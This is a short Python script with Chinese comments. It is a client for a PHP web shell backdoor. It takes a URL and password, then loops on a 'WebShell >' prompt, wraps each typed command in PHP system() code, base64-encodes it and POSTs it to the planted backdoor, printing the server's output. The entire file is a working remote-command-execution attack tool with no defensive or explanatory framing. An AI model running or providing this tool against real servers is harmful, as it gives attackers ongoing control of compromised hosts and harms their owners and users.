# python3 php_streamwrapper_backdoor.py -u <url> -p <password>
import requests
import base64
import sys
import getopt
import re

def httppost(url,password,code):
    code = bytes(code,encoding = "utf8")
    payload = base64.b64encode(code)
    data = {'password': password , 'code': payload}
    response = requests.post(url,data=data)
    html = response.text
    lines = re.split("\n",html)
    for line in lines:
        # 消除以 <br> 开头的警告信息
        if not line.startswith("<"):
            print(line)

def main(argv):
    url = ""
    password = ""
    
    # 获取命令行参数
    try:
        opts, args = getopt.getopt(argv,"h:u:p:",["--help","url=","password="])
    except getopt.GetoptError:
        print('usage : python3 backdoor.py -u <url> -p <password>')
        sys.exit(2)
    for opt,arg in opts:
        if opt == ('-h',"--help"):
            print('usage : python3 backdoor.py -u <url> -p <password>')
            sys.exit()
        elif opt in ("-u","--url"):
            url = arg
        elif opt in ("-p","--password"):
            password = arg
    
     # 交互式 Shell
    code = "<?php system('" + input('WebShell > ') + "'); ?>"
    while code != '':
        httppost(url,password,code)
        code = "<?php system('" + input('WebShell > ') + "'); ?>"

if __name__ == '__main__':
    main(sys.argv[1:])
